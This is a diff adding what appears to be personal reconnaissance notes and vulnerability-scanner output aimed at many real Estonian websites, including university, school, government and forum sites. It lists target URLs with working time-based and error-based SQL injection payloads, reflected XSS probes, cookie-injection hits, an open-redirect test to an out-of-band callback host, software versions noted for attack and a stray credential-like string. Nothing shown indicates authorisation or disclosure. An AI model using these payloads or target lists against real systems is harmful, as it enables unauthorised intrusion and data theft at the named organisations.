@@ -1,0 +1,111 @@
+https://www.ic-components.ee/message/completed.jsp?Email=Pen281992@gmail.com
+
+
+
+https://www.ic-components.ee/login.jsp?act=submit&ret_url=http://xrhxthberodihftowkmms8kglgkezkc6a.oast.fun
+
+
+
+## https://ladaklubi.ee/foorum/viewtopic.php?f=30&t=16367&p=148678#p148678 ## -- > SqlMap 
+
+https://annaabi.ee/s.php?s=veebilehed&cat=&hind=&pages=&format=&t=&keel=&p=5  @@@ Sql 
+
+https://ladaklubi.ee/foorum/ucp.php?mode=login%22
+
+
+J974bXfcZKCwxg3
+
+https://herentes.ee/ --- > wp-content/uploads/2018/08/ 
+
+https://amanitaeesti.ee/en/?s= WordPress 5.5.14
+
+
+https://www.deterchem.ee/ > -- WordPress 4.9.1
+
+
+https://m.naistekas.delfi.ee/picture.php?url=https%3A%2F%2Fg.delfi.ee%2Fimages%2Fpix%2F800x500%2FpJrbbiDYR3A%2Fcacb45c4837dc5ba07-85104473.jpg&article_url=https%3A%2F%2Fm.naistekas.delfi.ee%2Farticle.php%3Fid%3D85104389
+
+
+https://elhr.digilugu.ee/webservice/elhr.wsdl
+https://geoportaal.maaamet.ee/docs/geoloogia/RMRplokiandmed.wsdl
+https://in.bisnode.ee/soap.wsdl
+https://koodivaramu.eesti.ee/statistikaamet/xgate-client/blob/796ff9af12a0758a486c6e1f9933971380de33a7/src/main/resources/wsdl/xgate.wsdl
+https://www.tervisekassa.ee/sites/default/files/IT_juhised/xrdrets.wsdl
+https://www.ravimiregister.ee/Docs/RavimiregisterV6.wsdl
+https://x-tee.ee/catalogue-data/EE/EE/GOV/70003098/kkrmn/14.wsdl
+https://www.rik.ee/sites/www.rik.ee/files/elfinder/article_files/mkmkis-toru.wsdl
+https://luminor.ee/sites/default/files/documents/files/common/bankcorporatefileservice_20080616.wsdl
+https://koodivaramu.eesti.ee/riigiportaal-eesti.ee/xtr/-/blob/master/xtee-samples/wsdl/xtee_requests_extra/lkf.wsdl
+https://ncfailid.emta.ee/s/eFFzP8ExwXACgfE/download/kks.wsdl
+https://www.ravimiregister.ee/Docs/Koodikeskus.wsdl
+https://www.arved.ee/b2b/services/iWS-Invoices?wsdl
+https://tarktee.mnt.ee/tarktee/services?wsdl
+https://teenused.telia.ee/external/services/index.php?wsdl
+https://akit.cyber.ee/term/7679-wsdl
+https://testfinance.post.ee/finance/erp/erpServices.wsdl
+https://jvis.agri.ee/jvis/jvisXteeService?wsdl
+https://jvis.agri.ee/jvis/jvisXteeService?wsdl
+https://tarktee.ee/tarktee/services/Utilities?wsdl
+https://elhr.digilugu.ee/webservice/elhr.wsdl
+https://luminor.ee/sites/default/files/documents/files/common/bankcorporatefileservice_20080616.wsdl
+https://pood.aripaev.ee/dokumendinaidiste-teabevara?wsdl=
+
+
+
+ s=veebilehed) (SELECT(0)FROM(SELECT(SLEEP(6)))a)-- wXyW&cat=&hind=&pages=&format=&t=&keel=&p=5
+
+
+
+
+[time-based-sqli] [http] [high] http://fp0804.emu.ee/wiki/index.php?title=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&hidelinks=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&hideredirs=(SELECT(0)FROM(SELECT(SLEEP(7)))a)
+[time-based-sqli] [http] [high] http://elvalikaine.tlu.ee/?wp='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z
+[time-based-sqli] [http] [high] http://elvalikaine.tlu.ee/index.php?wp='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z
+[time-based-sqli] [http] [high] http://elvalikaine.tlu.ee/index.php?wp='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z
+[time-based-sqli] [http] [high] http://elvalikaine.tlu.ee/pdf.php?id='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z
+[time-based-sqli] [http] [high] https://dspace.ut.ee/?rpp=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&sort_by=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&type=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&etal=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&starts_with=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&order=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&locale-attribute=(SELECT(0)FROM(SELECT(SLEEP(7)))a)
+[time-based-sqli] [http] [high] https://geoeco.ut.ee/calendar?type=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&day=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&lang=(SELECT(0)FROM(SELECT(SLEEP(7)))a)
+[time-based-sqli] [http] [high] https://kannike.tartu.ee/uritus/murumunade-lapsevanemate-koosolek/?ical='XOR(SELECT+CASE+WHEN(1234=1234)+THEN+SLEEP(7)+ELSE+0+END)XOR'Z
+[time-based-sqli] [http] [high] https://kaardid.orienteerumine.ee/?filter=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&mk=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&map_type=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&year-start=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&year-end=(SELECT(0)FROM(SELECT(SLEEP(7)))a)
+[time-based-sqli] [http] [high] https://kunstikool.edu.ee/?fbclid=if(now()=sysdate(),SLEEP(7),0)
+[time-based-sqli] [http] [high] https://www.karlova.tartu.ee/index.php?lang='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z
+[time-based-sqli] [http] [high] https://www.karlova.tartu.ee/index.php?date='XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z
+
+
+
+
+
+
+
+
+
+
+[reflected-xss] [http] [medium] http://dok.ut.ee/livelink/livelink?func=LL.getlogin%26NextURL'"><47213
+[reflected-xss] [http] [medium] http://dok.ut.ee/livelink/livelink?func=LL.getlogin'"><47213&NextURL=/livelink/livelink/??Redirect%3d1
+[reflected-xss] [http] [medium] http://dok.ut.ee/livelink/livelink?func=ll.login'"><47213&Username=avatud&Password=avatud&NextURL=/livelink/livelink?func
+[reflected-xss] [http] [medium] http://dok.ut.ee/livelink/livelink?func=ll'"><47213&objtype=141&objaction=browse
+[cookie-injection] [http] [info] http://fahm.ut.ee/main?lang=encookie_injection
+[cookie-injection] [http] [info] http://fahm.ut.ee/?lang=etcookie_injection
+[sqli-error-based:mysql] [http] [critical] http://elvalikaine.tlu.ee/?wp=151' ["check the manual that corresponds to your MySQL server version","SQL syntax; check the manual that corresponds to your MySQL"]
+[sqli-error-based:mysql] [http] [critical] http://elvalikaine.tlu.ee/index.php?wp=151' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"]
+[sqli-error-based:mysql] [http] [critical] http://elvalikaine.tlu.ee/index.php?wp=790190' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"]
+[sqli-error-based:mysql] [http] [critical] http://elvalikaine.tlu.ee/pdf.php?id=230' ["SQL syntax; check the manual that corresponds to your MySQL","check the manual that corresponds to your MySQL server version"]
+[reflected-xss] [http] [medium] http://arhmus.tlu.ee/cgi-bin/epam/undefined?ctf_op=viewrec&ctf_table=objects'"><47213&ctf_rowid=105424
+[reflected-xss] [http] [medium] http://arhmus.tlu.ee/cgi-bin/epam?ctf_op=viewrec&ctf_table=objects'"><47213&ctf_rowid=105417
+[reflected-xss] [http] [medium] http://arhmus.tlu.ee/cgi-bin/epam/?ctf_op=viewrec&ctf_table=objects'"><47213&ctf_rowid=111031
+[INF] Skipped biit.cs.ut.ee:80 from target list as found unresponsive 30 times
+[cookie-injection] [http] [info] https://adrienne.ut.ee/partners?lang=encookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/gis-portal?lang=encookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/news-0?lang=encookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/?lang=encookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/project/?lang=encookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/research?lang=encookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/publications-0?lang=encookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/projektist-1/?lang=etcookie_injection
+[cookie-injection] [http] [info] https://adrienne.ut.ee/tegevused?lang=etcookie_injection
+
+[reflected-xss] [http] [medium] 
+http://arhmus.tlu.ee/cgi-bin/epam?ctf_op=csearch&ctf_nextop=viewrec&ctf_lastop=viewrec&ctf_table=objects&ctf_rowstart=0'"><47213&ctf_rowend=2&ctf_shown_rows=50&ctf_sort_field=author&ctf_sort_dir=asc&ctf_rowid=107314&ctf_op_args=%257B%2522keywords%2522%253A%2522Novek%252C%2520Karl%2522%257D&ctf_list_ids_json=%5B40887%2C+40820%2C+63068%2C+107314%2C+7666%2C+109441%2C+109440%2C+106280%2C+105720%2C+97112%2C+97044%2C+97043%2C+96367%2C+86758%2C+85802%2C+63091%2C+56730%2C+54709%2C+54705%2C+54385%2C+54326%2C+44386%2C+41013%2C+20767%5D&ctf_userlevel=10
+
+[reflected-xss] [http] [medium] http://www.kae.edu.ee/login?continue=/postlogin%3Fcontinue%3Dhttp%253A//www.kae.edu.ee/exercise/liitmine_1'"><47213&direct=1
+[reflected-xss] [http] [medium] http://www.kae.edu.ee/login?continue=/postlogin%3Fcontinue%3Dhttp%253A//www.kae.edu.ee/video/6--osa---koerad-ja-kassid%253Ftopic%253Dnuputusylesanded'"><47213&amp;direct=1
+
